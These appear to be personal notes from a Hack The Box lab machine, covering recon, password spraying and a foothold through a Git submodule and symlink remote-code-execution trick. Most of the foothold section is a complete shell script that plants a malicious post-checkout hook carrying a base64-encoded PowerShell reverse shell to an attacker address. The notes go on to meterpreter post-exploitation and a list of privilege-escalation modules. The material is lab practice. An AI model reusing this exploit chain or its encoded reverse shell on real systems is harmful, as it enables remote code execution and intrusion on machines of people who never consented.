


users
richard@compiled.htb


# nmap

## 3000
register user
hacker
hack@hacked.com
asdfasdf
found "signature" http://10.129.231.87:3000/richard/Compiled/src/branch/main/venv/Scripts/Activate.ps1

I think this article is telling me i can use this signature to run scripts once I'm on the box [Set-ExecutionPolicy Info](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4#example-7-unblock-a-script-to-run-it-without-changing-the-execution-policy)

## 5000

## 5985

crackmapexec winrm $IP -u richard@compiled@htb -P /opt/useful/seclists/Passwords/xato-net-10-million-passwords-1000000.txt

possible PoCs
https://amalmurali.me/posts/git-rce/
https://github.com/amalmurali47/git_rce
https://github.com/amalmurali47/hook

# Foothold 

create the following git repositories
- captain
- hook
run the following on kali:

create_poc.sh
```shell
#!/bin/bash
rm -rf captain hook

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the hook_repo_path path
hook_repo_path="http://10.129.15.120:3000/hacker/hook.git"

# Initialize the hook repository
git clone "$hook_repo_path"
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANgA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m 'post-checkout'
git push

cd ..

# Define the captain_repo_path
captain_repo_path="http://10.129.15.120:3000/hacker/captain.git"

# Initialize the captain repository
git clone "$captain_repo_path"
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"


# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git push
cd ..


```

Submit "captain.git" to http://compiled.htb:5000

```
http://compiled.htb:3000/hacker/captain.git
```

![[Pasted image 20240913134804.png]]

![[Pasted image 20240913134836.png]]

meterpreter > run post/multi/gather/env

![[Pasted image 20240913142648.png]]

![[Pasted image 20240913142708.png]]

cat pwnd
```
ruycr4ft_was_here
```

post/multi/recon/local_exploit_suggester

![[Pasted image 20240913143843.png]]

tried them all... none worked...
```
[+] 10.129.15.120 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.15.120 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.15.120 - exploit/windows/local/win_error_cve_2023_36874: The target appears to be vulnerable.
```

## When I return try...

Invoke-RunasC.ps1 with another reverse shell as the user emily who according to winPEAS does not have a password set...
